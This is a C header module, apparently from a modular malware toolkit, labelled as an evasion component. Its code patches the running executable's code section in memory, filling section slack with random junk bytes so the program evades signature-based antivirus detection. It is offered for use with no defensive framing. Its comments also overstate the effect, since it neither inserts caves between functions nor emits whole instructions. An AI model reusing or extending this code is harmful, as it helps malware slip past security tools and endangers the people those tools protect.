// chunk: evasion/code_cave
// depends: (none)
// provides: inject_code_caves
// headers: windows.h
// risk: none
// note: Injects random NOP/junk code caves between function boundaries at runtime.
//       Changes the PE's code section layout and entropy profile, defeating
//       signature-based detection that relies on fixed offsets between functions.
//       Called during init to modify the .text section in-place.

#ifndef CHUNK_CODE_CAVE
#define CHUNK_CODE_CAVE

#include <windows.h>

static void inject_code_caves(void) {
    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *pe = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(pe);

    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        BYTE *text_start = (BYTE *)base + sec->VirtualAddress;
        DWORD text_size = sec->Misc.VirtualSize;
        DWORD raw_size = sec->SizeOfRawData;

        if (raw_size <= text_size) continue;
        DWORD cave_space = raw_size - text_size;
        if (cave_space < 16) continue;

        BYTE *cave = text_start + text_size;
        DWORD old;
        if (!VirtualProtect(cave, cave_space, PAGE_EXECUTE_READWRITE, &old))
            continue;

        DWORD seed = GetTickCount() ^ (DWORD)(ULONG_PTR)cave;
        for (DWORD j = 0; j < cave_space; j++) {
            seed = seed * 1103515245 + 12345;
            BYTE b = (BYTE)(seed >> 16);
            /* Mix of NOPs, int3-free junk, and plausible x64 opcodes */
            static const BYTE junk_ops[] = {
                0x90, 0x90, 0x90,                   /* nop */
                0x48, 0x89, 0xC0,                   /* mov rax, rax */
                0x48, 0x31, 0xC9,                   /* xor rcx, rcx */
                0x48, 0x85, 0xC0,                   /* test rax, rax */
                0x4D, 0x89, 0xC0,                   /* mov r8, r8 */
                0x49, 0x89, 0xD1,                   /* mov r9, rdx */
                0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, /* lea rax, [rip+0] */
            };
            cave[j] = junk_ops[b % sizeof(junk_ops)];
        }

        VirtualProtect(cave, cave_space, old, &old);
        break;
    }
}

#endif
